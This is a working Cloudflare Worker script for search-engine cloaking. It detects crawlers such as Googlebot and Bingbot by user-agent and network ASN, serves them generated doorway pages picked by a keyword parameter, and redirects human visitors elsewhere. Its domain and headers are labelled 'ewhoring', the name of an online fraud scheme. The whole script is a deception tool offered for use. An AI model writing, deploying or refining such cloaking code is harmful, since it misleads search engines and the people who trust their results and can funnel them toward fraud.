export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const targetSlug = url.searchParams.get('kw');
    const ua = request.headers.get('user-agent') || '';
    const cf = request.cf || {};
    const asn = cf.asn || 0;

    const botSignals = [
      /googlebot/i,
      /bingbot/i,
      /duckduckbot/i,
      /baiduspider/i,
      /yandexbot/i,
      /linkedinbot/i,
      /facebookexternalhit/i
    ];

    const botAsn = [15169, 8075, 32934, 32934, 16509];
    const isBot = botSignals.some((regex) => regex.test(ua)) || botAsn.includes(Number(asn));

    if (!targetSlug) {
      return Response.redirect('https://ewhoring.com/', 302);
    }

    const doorwayUrl = `https://ewhoring.com/generated/${targetSlug}.html`;

    if (isBot) {
      const res = await fetch(doorwayUrl, {
        headers: {
          'User-Agent': 'ewhoring-cloak-bot'
        }
      });
      if (!res.ok) {
        return new Response('Doorway not ready', { status: 404 });
      }
      const headers = new Headers(res.headers);
      headers.set('Cache-Control', 'public, max-age=60');
      headers.set('X-Ewhoring-Cloak', 'bot');
      return new Response(res.body, { status: res.status, headers });
    }

    // Human visitors see SPA or cloaked experiment.
    const redirectTarget = env.HUMAN_DESTINATION || 'https://ewhoring.com/';
    return Response.redirect(redirectTarget, 302);
  }
};

